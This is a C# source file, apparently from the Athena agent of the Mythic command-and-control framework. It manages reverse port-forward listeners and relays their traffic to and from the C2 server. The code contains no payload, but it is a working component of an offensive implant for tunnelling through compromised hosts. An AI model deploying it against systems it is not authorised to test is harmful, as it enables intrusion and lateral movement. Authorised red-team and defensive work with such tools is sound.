using Athena.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Proxy;
using Athena.Utilities;
using System.Collections.Concurrent;

namespace Athena.Handler.Proxy
{
    public class RPortFwdHandler
    {
        //Track the number of listeners we have
        //private ConcurrentDictionary<int, AthenaTcpServer> connections { get; set; }
        private ConcurrentDictionary<int, AthenaTcpServer> connections { get; set; }
        private ConcurrentBag<MythicDatagram> messages = new ConcurrentBag<MythicDatagram>();

        public RPortFwdHandler()
        {
            connections = new ConcurrentDictionary<int, AthenaTcpServer>();
        }

        public async Task<bool> StartListener(MythicJob job)
        {
            var parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
            int port;
            if (int.TryParse(parameters["lport"], out port))
            {
                if (connections.ContainsKey(port))
                {
                    return false;
                }

                AthenaTcpServer ats = new AthenaTcpServer(port);
                return connections.TryAdd(port, ats);

            }
            return false;
        }
        public async Task<bool> StopListener(int port)
        {
            Console.WriteLine("Stopping Port: " + port);
            foreach(var conn in connections)
            {
                if (conn.Value.Port == port)
                {
                    Console.WriteLine("Stopping.");
                    conn.Value.Stop();
                    Console.WriteLine("Stopped.");
                    return connections.TryRemove(port, out _);
                }
            }
            return false;
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(MythicDatagram sm)
        {
            foreach(var connection in this.connections)
            {
                if (connection.Value.HasClient(sm.server_id)){
                    connection.Value.HandleMessage(sm);
                    break;
                }
            }
        }

        public void GetRportFwdMessages()
        {
            if (connections.Count < 1)
            {
                return;
            }

            foreach (var conn in connections)
            {
                List<MythicDatagram> returnMessages = conn.Value.GetMessages();
                foreach (var msg in returnMessages)
                {
                    ProxyResponseHandler.AddProxyMessageAsync(DatagramSource.RPortFwd, msg);
                }
            }
        }
    }
}
